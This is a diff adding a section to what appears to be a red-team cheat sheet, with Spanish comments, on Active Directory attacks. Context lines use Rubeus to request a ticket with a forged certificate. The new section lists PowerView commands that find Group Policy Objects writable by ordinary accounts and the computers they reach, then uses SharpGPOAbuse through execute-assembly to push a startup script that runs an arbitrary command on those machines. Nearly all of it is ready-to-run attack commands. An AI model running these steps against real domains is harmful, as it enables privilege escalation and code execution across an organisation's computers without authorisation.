@@ -430,3 +430,30 @@ cat cert.pfx | base64 -w 0
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:usuario_a_impersonar /certificate:base64 /password:pass_elegida /nowrap
 ```
+# Group Policy (GPO)
+
+## Modifying an existing GPO
+
+Mirar las GPOs que se pueden modificar y que pertenezcan a usuarios importantes (Domain Admins, SYSTEM...)
+```
+powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
+```
+Resolver cual es la GPO
+```
+powershell Get-DomainGPO -Identity "CN=(ObjectCN)" | select displayName, gpcFileSysPath
+```
+Ver quién puede modificar la GPO
+```
+powershell ConvertFrom-SID S-1-5-21-SID
+```
+Ver a quién aplica la GPO
+```
+ powershell Get-DomainOU -GPLink "{}" | select distinguishedName
+```
+```
+powershell Get-DomainComputer -SearchBase "OU=,DC=,DC=,DC=" | select dnsHostName
+```
+Modificar la GPO
+```
+execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b comando" --GPOName "NOMBRE_GPO"
+```
